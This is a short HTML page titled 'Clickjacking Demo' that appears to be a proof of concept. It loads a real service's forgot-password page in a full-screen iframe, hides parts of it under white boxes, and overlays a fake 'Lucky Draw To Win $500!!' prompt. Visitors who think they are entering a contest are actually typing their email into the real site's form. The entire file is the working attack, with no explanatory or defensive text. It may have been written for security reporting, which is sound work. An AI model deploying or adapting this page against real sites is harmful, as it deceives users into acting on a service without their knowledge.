<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clickjacking Demo</title>
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    overflow: hidden;
  }
  .container {
    position: absolute;
    top: 35%;
    left: 50%;
    transform: translate(-50%, -50%);
    text-align: center;
    z-index: 9999;
  }
  .white-box {
    position: fixed;
    top: 25%;
    left: 34.7%;
    width: 30.78%;
    height: 20%;
    background-color: rgb(255, 255, 255);
    z-index: 0;
  }
  .white-box_1 {
    position: fixed;
    top: 71.5%;
    left: 34.7%;
    width: 30.78%;
    height: 18%;
    background-color: rgb(255, 255, 255);
    z-index: 0;
  }
  .white-box_2 {
    position: fixed;
    top: 2%;
    left: 46%;
    width: 8%;
    height: 8%;
    background-color: rgb(241, 240, 238);
    z-index: 0;
  }
  iframe {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 1;
    z-index: -1;
    pointer-events: none;
  }
  /* Allow pointer events for background iframe */
  iframe.pointer-events {
    pointer-events: auto;
  }
</style>
</head>
<body>
<iframe src="https://www.relume.io/app/forgot-password?" title="Background Website" class="pointer-events"></iframe>

<div class="white-box_2"></div>

<div class="white-box"></div>

<div class="white-box_1"></div>

<div class="container">
  <!-- Overlay content -->
  <h2>Lucky Draw To Win $500!!</h2>
  <p>Enter your email ID for verification</p>
  <!-- Add your overlay content here -->
</div>

</body>
</html>
